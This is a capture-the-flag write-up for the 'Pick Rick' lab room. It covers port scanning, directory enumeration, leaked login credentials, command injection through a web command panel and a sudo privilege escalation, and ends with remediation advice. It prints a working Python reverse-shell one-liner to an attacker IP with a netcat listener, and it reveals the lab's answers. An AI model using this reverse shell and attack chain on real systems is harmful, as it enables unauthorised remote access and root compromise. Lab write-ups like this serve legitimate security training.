## General Information
- Room: Pick Rick 
- Difficulty: Easy
- Date: 13/03/2023
- Description: "This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle."


## Methodology
- Reconnaissance: 
    - Execution of port scanning using Nmap.
    - Access to the website https://10-10-68-143.p.thmlabs.com/ for obtaining information.
- Exploration:
    - Directory enumeration using Gobuster.
    - Analysis of pages http://10.10.76.140/robots.txt, http://10.10.76.140/login.php, and http://10.10.76.140/portal.php.
- Results Analysis:
    - Documentation of findings, identification of vulnerabilities, and recommendations for remediation.


## Results
Based on the exploration of the Pick Rick Machine, the following results were obtained:
- First Ingredient: "mr. meeseek hair"
- Second Ingredient: "1 jerry tear"
- Third Ingredient: Obtained by running sudo cat /root/3rd.txt
- The third ingredient was obtained by leveraging the sudo privileges granted to the www-data user.

### Reconnaissance
- https://10-10-68-143.p.thmlabs.com/: Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP* ....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP* , password was! Help Morty, Help! 

- IP: 10.10.76.140
- Port Scan results:

| Port     | State | Service | Version         |
|----------|-------|---------|-----------------|   
| 22/tcp   | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) |
| 80/tcp   | open  | http    | Apache httpd 2.4.18 ((Ubuntu)) |

### Exploitation

#### Nmap
~~~nmap
nmap -sVC -v -T4 -oA ./service_scan 10.10.76.140
~~~

#### gobuster
~~~ gobuster
gobuster dir -u http://10.10.76.140/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,html,txt 2>/dev/null | tee scan_gobuster_dir 
~~~

#### Inspect page http://10.10.76.140/
~~~Inspect  
http://10.10.76.140/: 
    Note to self, remember username!

    Username: R1ckRul3s

http://10.10.76.140/robots.txt: 
    Wubbalubbadubdub

http://10.10.76.140/login.php:
    Username: R1ckRul3s
    Password: Wubbalubbadubdub

http://10.10.76.140/portal.php
    Command Panel
    - 'ls': 
        Sup3rS3cretPickl3Ingred.txt
        assets
        clue.txt
        denied.php
        index.html
        login.php
        portal.php
        robots.txt
    - 'less Sup3rS3cretPickl3Ingred.txt':
        mr. meeseek hair
    - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.78.245 ",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
~~~

#### netcat listener
~~~netcat listener 
└─$ nc -lvnp 3333
~~~


## Exploited Vulnerabilities
- The password "Wubbalubbadubdub" was discovered through reconnaissance and provided access to the login page.
- By accessing the command panel on the portal page, arbitrary commands could be executed, allowing for further exploration and retrieval of the ingredients.
- The www-data user had unrestricted sudo privileges, allowing for the execution of privileged commands and access to the root directory.


## Recommendations
- Ensure that all user accounts, including the system administrator, use strong and unique passwords to prevent unauthorized access.
- Implement proper input validation and sanitization mechanisms to prevent command injection vulnerabilities.
- Review and restrict the sudo privileges granted to users, limiting their scope to only necessary commands and files.